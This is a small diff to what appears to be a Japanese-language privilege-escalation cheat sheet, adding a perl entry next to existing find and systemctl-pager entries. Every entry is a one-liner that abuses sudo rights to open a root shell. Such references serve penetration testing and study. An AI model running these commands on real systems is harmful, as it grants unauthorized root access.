@@ -10,4 +10,6 @@ sudo find . -exec /bin/sh \; -quit
 # systemctlとpagerの悪用
 sudo systemctl status <サービス>
 - (press RETURN)!sh
+# perlの悪用
+sudo perl -e 'exec "/bin/sh";'
 ```
